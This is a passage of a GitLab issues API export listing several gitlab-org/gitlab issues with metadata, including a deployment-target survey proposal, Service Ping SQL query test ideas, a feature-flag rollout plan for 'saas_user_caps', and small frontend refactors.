Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"}],"author":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"type":"ISSUE","assignee":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347550","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347550","notes":"https://gitlab.com/api/v4/projects/278964/issues/347550/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347550/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347550","relative":"#347550","full":"gitlab-org/gitlab#347550"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98762816,"iid":347547,"project_id":278964,"title":"Request deployment target info from users on new projects","description":"## Goal\n\nAs we prepare ourselves for the Deployment Management work, we should constantly aim at better understanding our users including their deployment requirements.\n\n[This Sisense query](https://app.periscopedata.com/app/gitlab/916395/WIP:-nagyv-sandbox?widget=13422880\u0026udv=1506868) shows how many projects are created per day containing a Dockerfile a few days later. 2-3 days after a project is started, there are often 1000+ projects that already have a Dockerfile. As this was a surprising insight, we would like to get a better understanding of the deployment targets.\n\nWe would like to know what is the deployment target on these projects\n\n## Proposal\n\n- Ask the user about their deployment target on the new project creation page\n- Store the response so we won't ask it again\n\nAdd options here\n\n![Kepernyofoto_2021-12-12_-_16.27.38](/uploads/8faad988c642ddad6687319913d9a549/Kepernyofoto_2021-12-12_-_16.27.38.png)\n\nQuestion: Where do you plan to deploy this project?\n\nOptions (multiple choice):\n\n- Kubernetes (GKE, EKS, OpenShift, etc)\n- Managed container runtime (Fargate, Cloud Run, Digitalocean App)\n- Self-managed container runtime (Podman, Docker Swarm, docker-compose)\n- Heroku\n- Virtual machine (EC2, etc)\n- Mobile app store\n- Registry (package or container)\n- Infrastructure provider (Terraform, Cloudformation, etc projects)\n- Serverless backend (Lambda, Cloud functions)\n- GitLab pages\n- Other hosting service\n- No deployment planned\n\n## Iterations\n\n1. Could we start with a frontend-only solution on the new project creation page?\n1. Store it in the DB and collect data from self-managed too\n1. Show a banner on projects where the value not set\n\n## Definition of done\n\n- [ ] Add a multi select to project creation form\n- [x] Hook it up to sisense\n- [ ] Store the value in the DB\n- [ ] Update usage ping to support this\n- [x] Document why we are doing this","state":"closed","created_at":"2021-12-09T15:56:03.427Z","updated_at":"2022-06-28T13:26:22.252Z","closed_at":"2022-02-08T14:15:01.230Z","closed_by":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"labels":["Deliverable","auto updated","devops::configure","frontend","group::configure","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"}],"author":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"type":"ISSUE","assignee":{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"},"user_notes_count":39,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347547","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347547","notes":"https://gitlab.com/api/v4/projects/278964/issues/347547/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347547/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347547","relative":"#347547","full":"gitlab-org/gitlab#347547"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98760904,"iid":347545,"project_id":278964,"title":"SPIKE: Add test for Service Ping generated queries for Snowflake","description":"# Summary\n\nFind a way to add a check/test for before and after database metrics changes of generated queries for Snowflake. \n\nThis allows us to tightly control and review changes to SQL metric queries and notify Data team if a query is changed to properly assess impact to the data warehouse (see #347542).\n\n# Proposal\n\nSome proposals here, more ideas could come up:\n\n1. ~~Use a fixture file with the queries generated and add a test against the [generated queries](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/usage_data_queries.rb)~~\n\nThis was attempted in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/82757, but had to be reverted due to:\n- Different behavior for developers with EE Free and EE with license (this could be fixed)\n- Failing nightly pipeline for PostgreSQL 11. A query differs between different PostgreSQL versions, so having this check as a spec might not actually be a viable solution:\n\n```diff\n-\"projects_with_enabled_alert_integrations_histogram\"=\u003e\"WITH \\\"count_cte\\\" AS (SELECT COUNT(*) AS count_grouped FROM \\\"alert_management_http_integrations\\\" WHERE \\\"alert_management_http_integrations\\\".\\\"active\\\" = TRUE GROUP BY \\\"alert_management_http_integrations\\\".\\\"project_id\\\") SELECT WIDTH_BUCKET(\\\"count_cte\\\".\\\"count_grouped\\\", 1, 100, 99) AS buckets, \\\"count_cte\\\".\\\"count\\\" FROM \\\"count_cte\\\" GROUP BY buckets ORDER BY buckets\", \"projects_with_error_tracking_enabled\"=\u003e\"SELECT COUNT(DISTINCT \\\"projects\\\".\\\"creator_id\\\") FROM \\\"projects\\\" INNER JOIN \\\"project_error_tracking_settings\\\" ON \\\"project_error_tracking_settings\\\".\\\"project_id\\\" = \\\"projects\\\".\\\"id\\\" WHERE \\\"project_error_tracking_settings\\\".\\\"enabled\\\" = TRUE\",\n+\"projects_with_enabled_alert_integrations_histogram\"=\u003e\"WITH \\\"count_cte\\\" AS MATERIALIZED (SELECT COUNT(*) AS count_grouped FROM \\\"alert_management_http_integrations\\\" WHERE \\\"alert_management_http_integrations\\\".\\\"active\\\" = TRUE GROUP BY \\\"alert_management_http_integrations\\\".\\\"project_id\\\") SELECT WIDTH_BUCKET(\\\"count_cte\\\".\\\"count_grouped\\\", 1, 100, 99) AS buckets, \\\"count_cte\\\".\\\"count\\\" FROM \\\"count_cte\\\" GROUP BY buckets ORDER BY buckets\", \"projects_with_error_tracking_enabled\"=\u003e\"SELECT COUNT(DISTINCT \\\"projects\\\".\\\"creator_id\\\") FROM \\\"projects\\\" INNER JOIN \\\"project_error_tracking_settings\\\" ON \\\"project_error_tracking_settings\\\".\\\"project_id\\\" = \\\"projects\\\".\\\"id\\\" WHERE \\\"project_error_tracking_settings\\\".\\\"enabled\\\" = TRUE\",\n```\n\nWe would have to play whack-a-mole adding problematic metrics to the ignorelist and there's no telling when a new database metric would cause similar issues. Upgrading PG might also cause this test to fail in the future.\n\n2. Using [API](https://docs.gitlab.com/ee/api/usage_data.html#export-service-ping-sql-queries). Maybe we can have a CI job that can run a check only if we have changed for database metrics and see a diff before after.\n\nThere are a bunch of problems to resolve there:\n- Queries will have different timestamps between runs, because they are usually constructed using Active Record. In RSpec freezing the timestamps was easy using `timecop`, but outside of Rails this might be non-trivial. Stubbing timestamps in the actual class / API endpoint might be a solution, but we need to ask Data team if they the rely on those timestamps in any way.\n- The diff must be made between the SQL queries in MR branch and the target branch. This might mean the SQL queries results have to be persisted somewhere (perhaps as a job artifact).\n\n\n\n### Scenarios\n\n1. Change the scope that is used for a metric.\n\n\n\n\n2. Rename of a column [example](https://gitlab.com/gitlab-data/analytics/-/merge_requests/7010#note_1059770482)\n\n3. Comparison of generated report against the API response","state":"closed","created_at":"2021-12-09T15:31:30.392Z","updated_at":"2022-10-26T12:19:17.764Z","closed_at":"2022-08-31T01:37:26.117Z","closed_by":{"id":11271910,"username":"carlocatimbang","name":"Carlo Catimbang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11271910/avatar.png","web_url":"https://gitlab.com/carlocatimbang"},"labels":["Category:Service Ping","Quality","devops::analytics","group::product intelligence","missed:14.9","missed:15.3","quad-planning::complete-no-action","section::analytics","spike","testing::coverage","type::maintenance","workflow::in review"],"milestone":null,"assignees":[{"id":11271910,"username":"carlocatimbang","name":"Carlo Catimbang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11271910/avatar.png","web_url":"https://gitlab.com/carlocatimbang"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":11271910,"username":"carlocatimbang","name":"Carlo Catimbang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11271910/avatar.png","web_url":"https://gitlab.com/carlocatimbang"},"user_notes_count":41,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347545","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":13,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347545","notes":"https://gitlab.com/api/v4/projects/278964/issues/347545/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347545/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347545","relative":"#347545","full":"gitlab-org/gitlab#347545"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7811,"epic":{"id":485752,"iid":7811,"title":"Harden services and processes within the Product Intelligence environment - Phase 2","url":"/groups/gitlab-org/-/epics/7811","group_id":9970,"human_readable_end_date":"Sep 30, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98760459,"iid":347544,"project_id":278964,"title":"Update Service Ping guide for database metrics","description":"# Summary\n\nUpdate Service Ping guide for database metrics\n\n# Details\n\n* We can consider using an MR template\n* Add generated query for Snowflake in MR description\n* Notify a data team member/group (This can be done with https://gitlab.com/gitlab-org/gitlab/-/issues/347542)\n* Create a separate issue in the data group, for review\n* Add docs under Service Ping guide.","state":"closed","created_at":"2021-12-09T15:27:22.462Z","updated_at":"2022-08-12T14:43:48.959Z","closed_at":"2022-08-12T14:35:23.613Z","closed_by":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"labels":["Category:Service Ping","devops::analytics","documentation","group::product intelligence","section::analytics","type::maintenance","workflow::blocked"],"milestone":null,"assignees":[],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347544","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347544","notes":"https://gitlab.com/api/v4/projects/278964/issues/347544/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347544/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347544","relative":"#347544","full":"gitlab-org/gitlab#347544"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7810,"epic":{"id":485751,"iid":7810,"title":"Harden services and processes within the Product Intelligence environment - Phase 1","url":"/groups/gitlab-org/-/epics/7810","group_id":9970,"human_readable_end_date":"Aug 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98745802,"iid":347524,"project_id":278964,"title":"[Feature flag] Phase 1 rollout of `saas_user_caps`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is for the **PHASE ONE** rollout [the feature](https://gitlab.com/gitlab-org/gitlab/-/issues/332590) on production,\nthat is currently behind the `saas_user_caps` feature flag.\n\nThe feature behind `saas_user_caps` is to (de)activate a user cap for a given group, to monitor that group's billable number and take action when that cap is reached.\n\nThis will be rolled out in two phases:\n\n* Phase 1: test feature flag on staging and production\n* Phase 2: eventually fully rollout and cleanup the feature flag\n\nThe reason why this needs to be in two phases is because initially we will only be rolling out the feature to certain customers manually via this feature flag. Phase one of the rollout is just to ensure we're happy with it's usage.\n\nOvertime and once the feature impact has been reviewed with those customers, the business/product can decide if we're to proceed with a full rollout or not.\n\nSome additional detail about this can be found here: https://gitlab.com/gitlab-org/gitlab/-/issues/336251#note_692902589\n\n## Owners\n\n- Team: Fulfillment Utilization\n- Most appropriate slack channel to reach out to: `#g_utilization`\n- Best individual to reach out to: @ebaque \n- PM: @amandarueda \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can also be useful to review --\u003e\n\n## Testing Groups/Projects/Users\n\n\u003c!-- If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example. --\u003e\n\n- `gitlab-org/gitlab` project\n- `gitlab-org`/`gitlab-com` groups\n- ...\n\n## Testing Plan\n\nA first draft / high level list of what we might want to run through when testing this on staging/production with a control group is:\n\n* Enabling the user cap for a root level group\n  * unavailable for sub-groups\n  * unavailable for groups that have shared externally\n* Adding members before the user cap is reached\n  * adding members to sub-groups/projects\n* Adding members after the user cap is reached\n  * adding members to sub-groups/projects\n* Increasing the user cap after it's reached\n* Viewing banners when the user cap is reached\n* Viewing pending members\n* Approving pending members\n* Restricted Project/Group access for pending members\n* Group sharing is disabled when user cap enabled\n* Pending members are not considered billable \n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen enabled, group owners will be able to assign a user cap value at the root namespace level.\n\nThis value will be used to determine if new members for the group or its subgroups and projects are added in an active (default) or awaiting (pending) state.\n\nAwaiting/pending state members will not count towards billable members and will have no access until approved.\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### What might happen if this goes wrong?\n\nThere could potentially be problems with adding members to groups/subgroups/projects within the hierarchy that has the feature flag enabled (e.g. access levels incorrect / unable to approve pending members)\n\nThe feature flag can be turned off, but there maybe members left in an `awaiting` state who would need to be manually set to `active`\n\n```ruby\nroot_group.members_with_descendants.awaiting.count\n\nroot_group.members_with_descendants.awaiting.map(\u0026:activate!)\n```\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n- `Groups::GroupMembersController` logs for group member related actions (https://log.gprd.gitlab.net/goto/71b373e0-7f50-11ec-a649-b7cbb8e4f62e) -- please note that there are existing/unrelated errors in these logs\n- API approve endpoint logs (https://log.gprd.gitlab.net/goto/f1249320-7f50-11ec-a649-b7cbb8e4f62e)\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- [ ] Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature for selected groups on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev --group=your-group`\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging --group=your-group`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e \u003cfeature-flag-name\u003e true --group=a-group`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n- [ ] Close this issue\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set saas_user_caps false\n```","state":"closed","created_at":"2021-12-09T11:30:40.637Z","updated_at":"2022-05-13T16:33:59.490Z","closed_at":"2022-03-08T14:40:37.907Z","closed_by":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"labels":["[deprecated] Accepting merge requests","[deprecated] Category:Utilization","auto updated","backend","devops::fulfillment","feature flag","group::utilization","missed:14.6","missed:14.7","missed:14.8","quad-planning::complete-no-action","section::fulfillment","workflow::ready for development"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"}],"author":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"type":"ISSUE","assignee":{"id":5249152,"username":"vij","name":"Vijay Hawoldar","state":"active","avatar_url":"https://secure.gravatar.com/avatar/14567a8b4af4374011c43778878de399?s=80\u0026d=identicon","web_url":"https://gitlab.com/vij"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347524","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":15,"completed_count":0},"weight":1,"blocking_issues_count":1,"has_tasks":true,"task_status":"0 of 15 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347524","notes":"https://gitlab.com/api/v4/projects/278964/issues/347524/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347524/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347524","relative":"#347524","full":"gitlab-org/gitlab#347524"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98743691,"iid":347522,"project_id":278964,"title":"Remove the unnecessary \"Edit\" tab in WebIDE if it's the only tab","description":"At the moment, we're showing the \"Edit\" tab for any file in WebIDE no matter whether there's any other action available or not. I think it's excessive: we're in the IDE and if we don't explicitly select some other actions, we're editing the files by default. Please do see the video.\n\n![WebIDE_edit_tab](/uploads/91079137c02704d7ed889ba56378f440/WebIDE_edit_tab.mov)\n\nI would suggest that we show the tabs only when there is any action(s) other than Edit.","state":"closed","created_at":"2021-12-09T10:51:34.267Z","updated_at":"2022-08-04T07:29:50.369Z","closed_at":"2022-08-04T07:27:39.491Z","closed_by":{"id":1474048,"username":"gtsiolis","name":"George Tsiolis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1474048/avatar.png","web_url":"https://gitlab.com/gtsiolis"},"labels":["Category:Web IDE","Development Department","Hackathon","Seeking community contributions","UX","[deprecated] Accepting merge requests","auto updated","devops::create","group::editor","section::dev"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3199302,"username":"dmishunov","name":"Denys Mishunov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d85e45af29611ac2c1395e3c3d6ec5d6?s=80\u0026d=identicon","web_url":"https://gitlab.com/dmishunov"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347522","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347522","notes":"https://gitlab.com/api/v4/projects/278964/issues/347522/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347522/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347522","relative":"#347522","full":"gitlab-org/gitlab#347522"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98739300,"iid":347517,"project_id":278964,"title":"Add row showing the MR's pipeline status","description":"## Problem to solve\n\nThe basic violation types for the ~frontend will be added in to #342901.\n\nThis issue is to add the pipeline status row for each violating MR.\n\n## Proposed solution\n\nCreate a component that can display the pipeline status for each violating MR along with the associated severity:\n\n* Passed / Passed with warnings - Info\n* Failed - Medium\n\n## Design\n\n![Page_1_](https://gitlab.com/groups/gitlab-org/-/uploads/dc8f1c53a81cf7c4bffc90c82c39979c/Page_1_.png)\n\n## Implementation\n\n~frontend :one:\n\n1. Create a component to display to the status and severity (reuse GitLab component)\n1. Add specs to confirm that the status is displayed correctly","state":"closed","created_at":"2021-12-09T09:47:11.686Z","updated_at":"2022-03-22T10:03:08.608Z","closed_at":"2022-03-22T10:03:08.600Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["Category:Compliance Management","Enterprise Edition","GitLab Ultimate","devops::manage","feature flag","feature::addition","frontend","group::compliance","section::dev","type::feature","workflow::problem validation"],"milestone":null,"assignees":[],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":null,"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347517","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347517","notes":"https://gitlab.com/api/v4/projects/278964/issues/347517/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347517/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347517","relative":"#347517","full":"gitlab-org/gitlab#347517"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5237,"epic":{"id":184672,"iid":5237,"title":"Convert compliance dashboard into an insightful report","url":"/groups/gitlab-org/-/epics/5237","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98729050,"iid":347507,"project_id":278964,"title":"Move \"reset integration\" code from Vuex to Vue component internals","description":"Follow-up to https://gitlab.com/gitlab-org/gitlab/-/issues/342121.\n\nWhen resetting an integration, the only component affected by state changes is the root component: `integration_form.vue`. We therefore don't need Vuex.\n\nThis issue is to move the \"resetting\" code from Vuex to the Vue component.","state":"closed","created_at":"2021-12-09T07:37:50.242Z","updated_at":"2022-11-22T19:10:35.777Z","closed_at":"2022-01-11T09:33:26.325Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Deliverable","devops::manage","frontend","group::integrations","maintenance::refactor","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347507","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347507","notes":"https://gitlab.com/api/v4/projects/278964/issues/347507/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347507/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347507","relative":"#347507","full":"gitlab-org/gitlab#347507"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98728942,"iid":347506,"project_id":278964,"title":"Move Integration Settings form element from HAML to Vue","description":"Follow-up to https://gitlab.com/gitlab-org/gitlab/-/issues/342121#note_755224001.\n\nOnce !76291 and !76409 merge, we will be able to move the `form` element from HAML to Vue.","state":"closed","created_at":"2021-12-09T07:35:25.594Z","updated_at":"2022-11-22T19:10:36.563Z","closed_at":"2022-01-21T07:27:26.971Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Deliverable","devops::manage","feature 